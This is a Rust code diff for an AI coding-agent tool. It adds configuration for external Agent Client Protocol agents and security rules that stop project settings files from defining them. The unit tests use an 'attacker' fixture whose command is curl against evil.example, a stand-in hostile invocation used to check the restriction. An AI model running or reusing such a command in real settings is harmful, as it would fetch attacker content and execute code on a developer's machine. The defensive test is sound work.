@@ -95,7 +95,7 @@ pub mod share_export;
 // Re-export commonly used types at the crate root
 pub use config::{
     builtin_managed_agent_presets, default_agents, strip_jsonc_comments, substitute_env_vars,
-    AgentDefinition, BudgetSplitPolicy, CommandTemplate, Config, FormatterConfig,
+    AcpAgentConfig, AgentDefinition, BudgetSplitPolicy, CommandTemplate, Config, FormatterConfig,
     ManagedAgentConfig, ManagedAgentPreset, McpServerConfig, McpServerOrigin, OutputFormat,
     PermissionMode, ProviderConfig, Settings, SkillsConfig, Theme,
 };
@@ -1271,6 +1271,10 @@ pub mod config {
         /// User-defined command templates (copied from Settings on load).
         #[serde(default)]
         pub commands: HashMap<String, CommandTemplate>,
+        /// External ACP agents reachable through the `AcpAgent` tool (copied
+        /// from Settings on load).
+        #[serde(default, rename = "acpAgents", alias = "acp_agents")]
+        pub acp_agents: HashMap<String, AcpAgentConfig>,
         /// Named agent definitions (copied from Settings on load).
         #[serde(default)]
         pub agents: HashMap<String, AgentDefinition>,
@@ -1655,6 +1659,11 @@ pub mod config {
         /// User-defined slash command templates.
         #[serde(default)]
         pub commands: HashMap<String, CommandTemplate>,
+        /// External ACP agents the `AcpAgent` tool can drive, keyed by the name
+        /// the model uses to pick one. Merged into [`Config::acp_agents`] by
+        /// [`Settings::effective_config`].
+        #[serde(default, rename = "acpAgents", alias = "acp_agents")]
+        pub acp_agents: HashMap<String, AcpAgentConfig>,
         /// Formatter configurations keyed by a user-defined name.
         #[serde(default)]
         pub formatter: HashMap<String, FormatterConfig>,
@@ -1726,6 +1735,24 @@ pub mod config {
             skip_serializing_if = "Option::is_none"
         )]
         pub file_injection_max_size: Option<usize>,
+    }
+
+    /// An external agent that speaks the Agent Client Protocol over stdio.
+    ///
+    /// Nothing here is agent-specific: whatever the user names runs as a
+    /// subprocess and is driven over ACP, so any conforming agent works.
+    #[derive(Debug, Clone, Default, Serialize, Deserialize)]
+    pub struct AcpAgentConfig {
+        /// Executable to run.
+        pub command: String,
+        /// Arguments passed to it. Usually whatever puts the agent in ACP mode.
+        #[serde(default)]
+        pub args: Vec<String>,
+        /// Extra environment for the child process. Values go through
+        /// `{env:VARNAME}` substitution so a token can be named rather than
+        /// written into the settings file.
+        #[serde(default)]
+        pub env: HashMap<String, String>,
     }
 
     /// A user-defined slash command template.
@@ -2453,6 +2480,18 @@ pub mod config {
                     .entry(k.clone())
                     .or_insert_with(|| v.clone());
             }
+            // Copy the ACP agent definitions, resolving `{env:VAR}` in their
+            // environment so a token can live in the environment rather than
+            // in the settings file.
+            for (k, v) in &self.acp_agents {
+                config.acp_agents.entry(k.clone()).or_insert_with(|| {
+                    let mut resolved = v.clone();
+                    for value in resolved.env.values_mut() {
+                        *value = substitute_env_vars(value);
+                    }
+                    resolved
+                });
+            }
             // Copy top-level agent definitions into config.
             for (k, v) in &self.agents {
                 config.agents.entry(k.clone()).or_insert_with(|| v.clone());
@@ -2631,6 +2670,10 @@ pub mod config {
                 ),
                 formatter: merge_map(base.config.formatter, over.config.formatter),
                 commands: merge_map(base.config.commands, over.config.commands),
+                // SECURITY: an ACP agent definition names an executable the
+                // model can invoke, so only the user's global settings may add
+                // one. Mirrors the `Settings::acp_agents` rule below.
+                acp_agents: base.config.acp_agents,
                 agents: merge_map(base.config.agents, over.config.agents),
                 skills: {
                     let mut paths = base.config.skills.paths;
@@ -2700,6 +2743,11 @@ pub mod config {
                 // this would gain a channel for driving the agent on the
                 // developer's machine.
                 remote_control: base.remote_control,
+                // SECURITY: same reasoning. An ACP agent definition names an
+                // executable that the model can then invoke, so a checked-out
+                // repository able to add one would gain arbitrary code
+                // execution on the developer's machine.
+                acp_agents: base.acp_agents,
                 // SECURITY: only the user's global settings may grant blanket
                 // trust to project MCP servers. A project's own settings file
                 // (`over`) must NOT be able to flip this on — otherwise a
@@ -2863,6 +2911,88 @@ pub mod config {
             }
         }
         result
+    }
+
+    #[cfg(test)]
+    mod acp_agent_merge_tests {
+        //! An `acpAgents` entry names an executable the model can invoke, so a
+        //! repository able to add one would gain arbitrary code execution on
+        //! the developer's machine.
+        use super::*;
+
+        fn agent() -> HashMap<String, AcpAgentConfig> {
+            HashMap::from([(
+                "attacker".to_string(),
+                AcpAgentConfig {
+                    command: "curl".to_string(),
+                    args: vec!["evil.example".to_string()],
+                    env: HashMap::new(),
+                },
+            )])
+        }
+
+        #[test]
+        fn a_project_settings_file_cannot_define_an_agent() {
+            let project = Settings {
+                acp_agents: agent(),
+                ..Default::default()
+            };
+            let merged = Settings::merge(Settings::default(), project);
+            assert!(
+                merged.acp_agents.is_empty(),
+                "only the user's global settings may define an ACP agent"
+            );
+        }
+
+        #[test]
+        fn a_project_config_block_cannot_define_an_agent_either() {
+            // The same map exists inside `config`, which is the copy the tool
+            // actually reads. Closing only the outer door would leave this one
+            // open.
+            let project = Settings {
+                config: Config {
+                    acp_agents: agent(),
+                    ..Default::default()
+                },
+                ..Default::default()
+            };
+            let merged = Settings::merge(Settings::default(), project);
+            assert!(merged.config.acp_agents.is_empty());
+        }
+
+        #[test]
+        fn the_users_own_agents_survive_the_merge() {
+            let user = Settings {
+                acp_agents: agent(),
+                ..Default::default()
+            };
+            let merged = Settings::merge(user, Settings::default());
+            assert!(merged.acp_agents.contains_key("attacker"));
+        }
+
+        #[test]
+        fn env_values_are_resolved_when_copied_into_the_effective_config() {
+            std::env::set_var("CLAURST_TEST_ACP_TOKEN", "resolved-secret");
+            let settings = Settings {
+                acp_agents: HashMap::from([(
+                    "gemini".to_string(),
+                    AcpAgentConfig {
+                        command: "gemini".to_string(),
+                        args: vec![],
+                        env: HashMap::from([(
+                            "TOKEN".to_string(),
+                            "{env:CLAURST_TEST_ACP_TOKEN}".to_string(),
+                        )]),
+                    },
+                )]),
+                ..Default::default()
+            };
+
+            let config = settings.effective_config();
+            let resolved = &config.acp_agents["gemini"].env["TOKEN"];
+            assert_eq!(resolved, "resolved-secret");
+            std::env::remove_var("CLAURST_TEST_ACP_TOKEN");
+        }
     }
 
     #[cfg(test)]
